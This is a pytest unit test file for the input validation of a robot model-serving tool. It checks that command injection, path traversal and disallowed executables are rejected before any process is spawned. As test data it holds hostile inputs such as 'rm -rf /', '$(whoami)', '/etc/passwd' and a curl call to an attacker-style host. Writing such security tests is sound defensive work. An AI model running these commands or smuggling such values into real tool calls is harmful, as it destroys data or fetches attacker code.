"""Unit tests for the qwen_vla_inference @tool input validation + dispatch.

Security focus: the allowlist must reject shell metacharacters, traversal,
protected paths, and non-loopback bind hosts before any subprocess/path I/O.
"""

import pytest

from strands_robots.tools.qwen_vla_inference import _validate_inputs, qwen_vla_inference


class TestValidateInputs:
    def test_valid_passes(self):
        assert (
            _validate_inputs(
                action="start", data_config="so100", host="127.0.0.1", port=5556, model_path="models/qwen", bind=True
            )
            is None
        )

    def test_unknown_action(self):
        err = _validate_inputs(
            action="nuke", data_config="so100", host="127.0.0.1", port=5556, model_path=None, bind=False
        )
        assert err and "Unknown action" in err

    def test_unknown_data_config(self):
        err = _validate_inputs(
            action="status", data_config="bogus", host="127.0.0.1", port=5556, model_path=None, bind=False
        )
        assert err and "Unknown data_config" in err

    @pytest.mark.parametrize("bad_host", ["127.0.0.1; rm -rf /", "$(whoami)", "a|b", "a b", "host/../etc"])
    def test_shell_metacharacter_hosts_rejected(self, bad_host):
        err = _validate_inputs(
            action="status", data_config="so100", host=bad_host, port=5556, model_path=None, bind=False
        )
        assert err and "invalid characters" in err

    def test_nonloopback_bind_rejected(self):
        err = _validate_inputs(
            action="start", data_config="so100", host="0.0.0.0", port=5556, model_path="m", bind=True
        )
        assert err and "loopback" in err

    def test_nonloopback_allowed_when_not_binding(self):
        # ping/status against a remote host is allowed (no server bind).
        assert (
            _validate_inputs(
                action="ping", data_config="so100", host="10.0.0.5", port=5556, model_path=None, bind=False
            )
            is None
        )

    @pytest.mark.parametrize("bad_port", [0, 70000, -1, "5556"])
    def test_bad_port_rejected(self, bad_port):
        err = _validate_inputs(
            action="status", data_config="so100", host="127.0.0.1", port=bad_port, model_path=None, bind=False
        )
        assert err and "port" in err

    def test_traversal_model_path_rejected(self):
        err = _validate_inputs(
            action="start", data_config="so100", host="127.0.0.1", port=5556, model_path="../../etc/x", bind=True
        )
        assert err and ".." in err

    def test_protected_model_path_rejected(self):
        err = _validate_inputs(
            action="start", data_config="so100", host="127.0.0.1", port=5556, model_path="/etc/passwd", bind=True
        )
        assert err and "protected" in err


class TestToolDispatch:
    def test_status_not_running(self):
        # Port almost certainly free in CI.
        res = qwen_vla_inference(action="status", data_config="so100", port=5599)
        assert res["status"] == "success"
        assert res["service_status"] == "not_running"

    def test_start_requires_model_path(self):
        res = qwen_vla_inference(action="start", data_config="so100", port=5599)
        assert res["status"] == "error"
        assert "model_path" in res["message"]

    def test_start_without_server_command_is_clear_error(self):
        res = qwen_vla_inference(action="start", data_config="so100", model_path="models/qwen", port=5599)
        assert res["status"] == "error"
        assert "server_command" in res["message"]

    def test_list_returns_services_key(self):
        res = qwen_vla_inference(action="list", data_config="so100")
        assert res["status"] == "success"
        assert "services" in res

    def test_invalid_action_returns_error_dict(self):
        res = qwen_vla_inference(action="explode", data_config="so100")
        assert res["status"] == "error"

    def test_bad_data_config_returns_error_dict(self):
        res = qwen_vla_inference(action="status", data_config="nope")
        assert res["status"] == "error"


class TestServerCommandExecutableAllowlist:
    """PR #92 LLM-input-safety baseline: argv[0] from ``server_command`` must
    be matched against ``validate_executable`` before ``subprocess.Popen``.

    Pinned regression test - fails on pre-fix code where the start path
    invoked ``subprocess.Popen`` with whatever executable the caller passed.
    """

    def test_disallowed_executable_rejected_before_subprocess(self, monkeypatch):
        # Sentinel: if Popen is reached we have a security regression.
        called = {"popen": False}

        def fake_popen(*args, **kwargs):  # pragma: no cover - guard
            called["popen"] = True
            raise AssertionError("subprocess.Popen must not be reached for a disallowed executable")

        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", fake_popen)
        # Make _is_service_running return False so we proceed into _start_service.
        monkeypatch.setattr(
            "strands_robots.tools.qwen_vla_inference._is_service_running",
            lambda host, port: False,
        )

        res = qwen_vla_inference(
            action="start",
            data_config="so100",
            model_path="models/qwen",
            port=5599,
            server_command="rm -rf /home/ubuntu",
        )
        assert res["status"] == "error"
        assert "server_command[0]" in res["message"]
        assert "allowlist" in res["message"]
        assert called["popen"] is False

    def test_disallowed_absolute_path_rejected(self, monkeypatch):
        called = {"popen": False}

        def fake_popen(*args, **kwargs):  # pragma: no cover
            called["popen"] = True
            raise AssertionError("subprocess.Popen must not be reached for /usr/bin/curl")

        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", fake_popen)
        monkeypatch.setattr(
            "strands_robots.tools.qwen_vla_inference._is_service_running",
            lambda host, port: False,
        )

        res = qwen_vla_inference(
            action="start",
            data_config="so100",
            model_path="models/qwen",
            port=5599,
            server_command="/usr/bin/curl http://evil.example/x",
        )
        assert res["status"] == "error"
        assert "server_command[0]" in res["message"]
        assert called["popen"] is False

    def test_shell_metacharacter_in_argv0_rejected(self, monkeypatch):
        called = {"popen": False}

        def fake_popen(*args, **kwargs):  # pragma: no cover
            called["popen"] = True
            raise AssertionError("Popen reached with shell-metacharacter argv[0]")

        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", fake_popen)
        monkeypatch.setattr(
            "strands_robots.tools.qwen_vla_inference._is_service_running",
            lambda host, port: False,
        )

        res = qwen_vla_inference(
            action="start",
            data_config="so100",
            model_path="models/qwen",
            port=5599,
            # shlex.split keeps these characters as part of the first token,
            # so the path-character allowlist must reject them.
            server_command="python$(whoami)",
        )
        assert res["status"] == "error"
        assert called["popen"] is False

    @pytest.mark.parametrize(
        "good_cmd",
        [
            "python -m qwen_vla.serve",
            "python3 -m qwen_vla.serve",
            "python3.12 -m qwen_vla.serve",
            "uv run -m qwen_vla.serve",
            "/usr/bin/python3 -m qwen_vla.serve",
            "/opt/venv/bin/python3.12 -m qwen_vla.serve",
        ],
    )
    def test_documented_entrypoints_pass_validation(self, monkeypatch, good_cmd):
        # We only assert validation passes (Popen is mocked to a no-op so
        # the test does not actually spawn a process). The call still falls
        # through to the connect-loop and times out, which is fine - the
        # invariant we pin is that argv[0] validation does not reject these
        # documented launchers.
        popen_calls = []

        class FakePopen:
            def __init__(self, argv, **kwargs):
                popen_calls.append(argv)

        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", FakePopen)
        monkeypatch.setattr(
            "strands_robots.tools.qwen_vla_inference._is_service_running",
            lambda host, port: False,
        )
        # Short-circuit the connect loop.
        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.time.sleep", lambda _: None)
        monkeypatch.setattr(
            "strands_robots.tools.qwen_vla_inference.time.time",
            iter([0.0, 0.1, 1000.0]).__next__,
        )

        res = qwen_vla_inference(
            action="start",
            data_config="so100",
            model_path="models/qwen",
            port=5599,
            server_command=good_cmd,
        )
        # Validation passed (Popen was reached); we do not assert on the
        # eventual error since we forced _is_service_running=False to skip
        # the real network probe.
        assert popen_calls, f"validate_executable wrongly rejected documented entrypoint {good_cmd!r}: {res}"
